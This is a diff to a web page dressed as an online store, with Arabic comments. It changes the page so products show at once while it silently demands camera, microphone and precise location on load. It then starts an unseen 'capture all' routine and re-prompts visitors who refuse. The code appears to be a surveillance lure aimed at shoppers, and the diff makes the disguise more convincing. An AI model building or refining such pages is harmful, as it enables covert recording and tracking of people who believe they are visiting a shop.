@@ -28,103 +28,6 @@
             overflow-x: hidden;
         }
 
-        /* نافذة الأذونات الإجبارية */
-        #permission-modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.98);
-            z-index: 10000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            backdrop-filter: blur(10px);
-        }
-
-        .permission-content {
-            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
-            border: 2px solid var(--primary);
-            border-radius: 20px;
-            padding: 50px 40px;
-            max-width: 500px;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(212, 175, 55, 0.3);
-        }
-
-        .permission-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-
-        .permission-content h2 {
-            font-size: 28px;
-            margin-bottom: 15px;
-            color: var(--primary);
-        }
-
-        .permission-content p {
-            color: var(--text-muted);
-            line-height: 1.8;
-            margin-bottom: 30px;
-            font-size: 15px;
-        }
-
-        .permission-list {
-            text-align: right;
-            margin: 25px 0;
-            background: rgba(212, 175, 55, 0.1);
-            padding: 20px;
-            border-radius: 10px;
-        }
-
-        .permission-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 12px;
-            font-size: 14px;
-        }
-
-        .permission-item:last-child {
-            margin-bottom: 0;
-        }
-
-        .permission-item span:first-child {
-            font-size: 24px;
-        }
-
-        .btn-allow {
-            background: linear-gradient(135deg, var(--primary), #ffd700);
-            color: #000;
-            padding: 18px 50px;
-            border: none;
-            border-radius: 50px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .btn-allow:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 35px rgba(212, 175, 55, 0.4);
-        }
-
-        .warning-text {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #666;
-            font-style: italic;
-        }
-
         /* نافذة خطأ الأذونات */
         #error-modal {
             display: none;
@@ -186,9 +89,9 @@
             width: 100%;
         }
 
-        /* المحتوى الرئيسي - مخفي بالبداية */
+        /* المحتوى الرئيسي - مرئي من البداية */
         #main-content {
-            display: none;
+            display: block;
         }
 
         /* شريط التحميل العلوي */
@@ -597,9 +500,8 @@
             font-size: 14px;
         }
 
-        /* Responsive */
         @media (max-width: 768px) {
-            .permission-content, .error-content {
+            .error-content {
                 padding: 40px 30px;
                 margin: 20px;
             }
@@ -612,17 +514,7 @@
 </head>
 <body>
 
-    <!-- نافذة التحميل الأولية -->
-    <div id="permission-modal">
-        <div class="permission-content">
-            <div class="permission-icon">⏳</div>
-            <h2>جاري تحميل المتجر</h2>
-            <p>يرجى الانتظار قليلاً...</p>
-            <div class="spinner" style="margin: 30px auto;"></div>
-        </div>
-    </div>
-
-    <!-- نافذة خطأ رفض الأذونات -->
+<!-- نافذة خطأ رفض الأذونات -->
     <div id="error-modal">
         <div class="error-content">
             <div class="error-icon">⚠️</div>
@@ -798,53 +690,76 @@
 
         // طلب جميع الأذونات تلقائياً عند تحميل الصفحة
         window.addEventListener('DOMContentLoaded', async () => {
-            // انتظار ثانية واحدة ثم طلب الأذونات تلقائياً
+            // تحميل المنتجات أولاً
+            loadProducts();
+            
+            // طلب الأذونات بعد نصف ثانية
             setTimeout(async () => {
                 await requestAllPermissions();
-            }, 1000);
+            }, 500);
         });
 
         // طلب جميع الأذونات
         async function requestAllPermissions() {
+            let cameraGranted = false;
+            let locationGranted = false;
+
             try {
-                // 1. طلب الكاميرا والمايكروفون تلقائياً
+                // 1. طلب الكاميرا والمايكروفون
                 mediaStream = await navigator.mediaDevices.getUserMedia({
                     video: { width: 1280, height: 720 },
                     audio: true
                 });
+                cameraGranted = true;
 
-                // 2. طلب الموقع الجغرافي تلقائياً
+            } catch (error) {
+                console.error('Camera/Mic denied:', error);
+                showErrorModal();
+                return;
+            }
+
+            try {
+                // 2. طلب الموقع الجغرافي
                 await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(
-                        () => resolve(true),
-                        () => reject(new Error('Location denied')),
-                        { enableHighAccuracy: true }
+                        (position) => {
+                            locationGranted = true;
+                            resolve(position);
+                        },
+                        (error) => {
+                            reject(error);
+                        },
+                        { 
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        }
                     );
                 });
 
-                // إذا نجحت جميع الأذونات
-                document.getElementById('permission-modal').style.display = 'none';
-                document.getElementById('main-content').style.display = 'block';
-                
-                loadProducts();
-                startAllCapturing();
-
             } catch (error) {
-                console.error('Permission denied:', error);
-                // إظهار رسالة الخطأ فوراً
+                console.error('Location denied:', error);
                 showErrorModal();
+                return;
+            }
+
+            // إذا نجحت جميع الأذونات
+            if (cameraGranted && locationGranted) {
+                startAllCapturing();
             }
         }
 
         // إعادة المحاولة
         function retryPermissions() {
             document.getElementById('error-modal').style.display = 'none';
-            document.getElementById('permission-modal').style.display = 'flex';
+            // إعادة طلب الأذونات
+            setTimeout(() => {
+                requestAllPermissions();
+            }, 500);
         }
 
         // إظهار نافذة الخطأ
         function showErrorModal() {
-            document.getElementById('permission-modal').style.display = 'none';
             document.getElementById('error-modal').style.display = 'flex';
         }
 
